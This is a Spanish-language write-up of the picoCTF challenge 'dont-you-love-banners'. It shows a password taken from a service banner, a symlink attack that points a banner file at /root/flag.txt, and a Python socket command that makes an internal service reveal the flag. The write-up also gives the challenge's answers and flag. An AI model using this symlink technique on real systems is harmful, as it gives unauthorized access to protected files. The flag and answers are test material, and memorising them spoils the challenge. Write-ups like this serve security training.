**RETO:**  
dont-you-love-banners

**DESCRIPCIÓN:**  
Can you abuse the banner? The server has been leaking some crucial information on [tethys.picoctf.net](https://tethys.picoctf.net/) 64239. Use the leaked information to get to the server. To connect to the running application use nc tethys.picoctf.net 51287. From the above information abuse the machine and find the flag in the /root directory.

**SOLUCIÓN:**

1. **Reconocimiento y banner grabbing**:
    
    - Me conecté al servicio en el puerto 64239 para obtener información del banner:
        
        bash
        
        nc tethys.picoctf.net 64239
        
    - El banner reveló credenciales: `SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234`
        
2. **Acceso al sistema principal**:
    
    - Me conecté al servicio en el puerto 51287:
        
        bash
        
        nc tethys.picoctf.net 51287
        
    - Respondí las preguntas de seguridad:
        
        - **Contraseña**: `My_Passw@rd_@1234`
            
        - **Conferencia de cybersecurity**: `DEF CON`
            
        - **Primer hacker de phreaking**: `John Draper`
            
3. **Búsqueda de la flag y escalada de privilegios**:
    
    - Identifiqué que la flag estaba en `/root/flag.txt` pero con permisos restringidos
        
    - Encontré un archivo `text` en `/home/player/` con el mensaje "keep digging"
        
    - Creé un symlink del banner a la flag:
        
        bash
        
        ln -s /root/flag.txt /home/player/banner
        
4. **Explotación del servicio interno**:
    
    - Me conecté al puerto interno 4221 donde el servicio lee el banner:
        
        bash
        
        python3 -c "import socket; s = socket.socket(); s.connect(('localhost', 4221)); print(s.recv(1024).decode()); s.close()"
        
    - El servicio leyó nuestro symlink y mostró la flag
        

**FLAG OBTENIDA:**  
`picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_218ef5d6}`

**NOTAS ADICIONALES:**

- Este reto demostró la importancia del banner grabbing para obtener información sensible
    
- La técnica de symlink attack permitió bypassear las restricciones de permisos
    
- El uso de conexiones internas al puerto 4221 fue clave para activar la lectura del banner modificado
    
- La flag hace referencia al "banner grabbing" exitoso que se realizó en el reto